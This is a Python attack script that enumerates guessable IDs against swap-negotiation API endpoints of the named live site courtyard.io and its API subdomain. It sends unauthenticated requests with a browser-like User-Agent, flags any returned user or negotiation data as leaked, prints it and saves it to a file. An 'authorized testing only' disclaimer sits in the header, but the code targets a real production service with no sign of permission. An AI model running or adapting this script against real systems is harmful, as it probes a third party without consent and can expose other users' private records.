#!/usr/bin/env python3
"""
Courtyard.io IDOR Tester
Tests swap negotiation endpoints for Insecure Direct Object Reference.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""
import requests
import json
import time
from pathlib import Path
from datetime import datetime

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
}

BASE = "https://courtyard.io"
API_SUB = "https://api.courtyard.io"

# IDOR test patterns
ID_PATTERNS = [
    # Sequential IDs
    *[str(i) for i in range(1, 100)],
    # Common UUID patterns
    "00000000-0000-0000-0000-000000000001",
    "11111111-1111-1111-1111-111111111111",
    # Firebase-style IDs (20 chars)
    "a" * 20,
    "1" * 20,
]

ENDPOINTS = {
    "negotiation": "/v2/swap/negotiations/{}",
    "user_negotiations": "/v2/swap/users/{}/negotiations",
    "asks": "/v2/swap/negotiations/{}/asks",
    "bids": "/v2/swap/negotiations/{}/bids",
    "accept_ask": "/v2/swap/negotiations/{}/asks/{}/accept",
}

def test_endpoint(name, url, auth_token=None):
    """Test an endpoint for IDOR vulnerability."""
    headers = dict(HEADERS)
    if auth_token:
        headers['Authorization'] = f'Bearer {auth_token}'

    results = []
    for test_id in ID_PATTERNS[:20]:  # Limit to 20 tests per endpoint
        try:
            full_url = f"{BASE}{url.format(test_id, test_id)}"
            r = requests.get(full_url, headers=headers, timeout=10, allow_redirects=False)

            result = {
                "endpoint": name,
                "test_id": test_id,
                "status": r.status_code,
                "size": len(r.text),
                "timestamp": datetime.now().isoformat(),
            }

            # Check for data leakage
            if r.status_code == 200:
                try:
                    data = r.json()
                    result["json"] = data
                    result["vulnerable"] = True
                    result["leakage"] = "JSON data returned without auth"
                except:
                    if "negotiation" in r.text.lower() or "user" in r.text.lower():
                        result["vulnerable"] = True
                        result["leakage"] = "Data-like response without auth"
                    else:
                        result["vulnerable"] = False

            elif r.status_code == 403:
                result["vulnerable"] = False
                result["note"] = "Forbidden - auth required"

            elif r.status_code == 401:
                result["vulnerable"] = False
                result["note"] = "Unauthorized - auth required"

            elif r.status_code == 404:
                result["vulnerable"] = False
                result["note"] = "Not found - ID doesn't exist"

            results.append(result)

        except requests.Timeout:
            results.append({"endpoint": name, "test_id": test_id, "status": "timeout"})
        except Exception as e:
            results.append({"endpoint": name, "test_id": test_id, "status": "error", "error": str(e)})

        time.sleep(0.5)  # Rate limit

    return results

def test_api_subdomain(name, test_id, auth_token=None):
    """Test on api.courtyard.io subdomain."""
    headers = dict(HEADERS)
    if auth_token:
        headers['Authorization'] = f'Bearer {auth_token}'

    results = []
    url = f"{API_SUB}/v2/swap/negotiations/{test_id}"

    try:
        r = requests.get(url, headers=headers, timeout=10)
        results.append({
            "endpoint": f"api.{name}",
            "test_id": test_id,
            "status": r.status_code,
            "size": len(r.text),
            "response": r.text[:200],
            "timestamp": datetime.now().isoformat(),
        })
    except Exception as e:
        results.append({"endpoint": f"api.{name}", "test_id": test_id, "error": str(e)})

    return results

def scan_all():
    """Run full IDOR scan."""
    all_results = []

    print("=== Courtyard.io IDOR Tester ===")
    print(f"Time: {datetime.now().isoformat()}")
    print()

    # Test main domain (no auth)
    print("[*] Testing main domain (no auth)...")
    for name, url in ENDPOINTS.items():
        print(f"  Testing {name}...")
        results = test_endpoint(name, url)
        all_results.extend(results)

    # Test API subdomain (no auth)
    print("\n[*] Testing api.courtyard.io (no auth)...")
    for test_id in ID_PATTERNS[:5]:
        results = test_api_subdomain("negotiation", test_id)
        all_results.extend(results)

    # Analyze results
    vulnerable = [r for r in all_results if r.get("vulnerable")]
    forbidden = [r for r in all_results if r.get("status") == 403]
    unauthorized = [r for r in all_results if r.get("status") == 401]
    not_found = [r for r in all_results if r.get("status") == 404]
    errors = [r for r in all_results if "error" in r]

    print(f"\n=== RESULTS ===")
    print(f"Total tests: {len(all_results)}")
    print(f"Vulnerable (data leaked): {len(vulnerable)}")
    print(f"Forbidden (auth required): {len(forbidden)}")
    print(f"Unauthorized: {len(unauthorized)}")
    print(f"Not found: {len(not_found)}")
    print(f"Errors: {len(errors)}")

    if vulnerable:
        print(f"\n=== VULNERABLE ENDPOINTS ===")
        for v in vulnerable:
            print(f"  [{v['endpoint']}] ID: {v['test_id']}")
            print(f"    Status: {v['status']}")
            print(f"    Leakage: {v.get('leakage', 'N/A')}")
            if 'json' in v:
                print(f"    Data: {json.dumps(v['json'], indent=2)[:500]}")

    # Save results
    output = {
        "scan_time": datetime.now().isoformat(),
        "total_tests": len(all_results),
        "summary": {
            "vulnerable": len(vulnerable),
            "forbidden": len(forbidden),
            "unauthorized": len(unauthorized),
            "not_found": len(not_found),
        },
        "vulnerable_endpoints": vulnerable,
        "all_results": all_results,
    }

    output_path = Path("courtyard_idor_results.json")
    output_path.write_text(json.dumps(output, indent=2))
    print(f"\n[+] Results saved to: {output_path}")

    return output

if __name__ == "__main__":
    scan_all()
